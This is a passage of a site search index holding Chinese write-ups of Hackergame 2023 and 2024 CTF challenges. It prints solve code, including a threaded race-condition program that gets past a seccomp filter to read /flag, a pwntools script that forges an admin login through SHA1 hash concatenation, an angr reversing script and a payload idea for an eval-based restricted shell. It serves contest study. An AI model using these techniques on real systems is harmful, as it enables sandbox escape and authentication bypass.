59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" )","title":"\ud83e\ude90 \u6d41\u5f0f\u661f\u7403"},{"location":"writeups/hackergame2023/#_9","text":"\u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002","title":"\ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403"},{"location":"writeups/hackergame2023/#komm-susser-flagge","text":"\u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002","title":"Komm, s\u00fcsser Flagge"},{"location":"writeups/hackergame2023/#flag_1","text":"\u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; }","title":"\u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21"},{"location":"writeups/hackergame2023/#_10","text":"\u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86","title":"\u5f02\u661f\u6b67\u9014"},{"location":"writeups/hackergame2023/#20_1","text":"\u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0"},{"location":"writeups/hackergame2023/#f5","text":"\u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" )","title":"\u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5"},{"location":"writeups/hackergame2023/#o1","text":"\u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive ()","title":"O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf"},{"location":"writeups/hackergame2023/#_11","text":"\u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"\u5176\u4ed6"},{"location":"writeups/hackergame2024/","text":"Hackergame 2024 \u00b6 \u7ea6 1382 \u4e2a\u5b57 167 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024 \u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86 \u00b6 \u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5 PowerfulShell \u00b6 \u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002 \u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:) \u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f \u00b6 \u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive () \u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6 \u00b6 \u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11 \u96f6\u77e5\u8bc6\u6570\u72ec \u00b6 \u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002 \u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d \u00b6 \u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"Hackergame 2024"},{"location":"writeups/hackergame2024/#hackergame-2024","text":"\u7ea6 1382 \u4e2a\u5b57 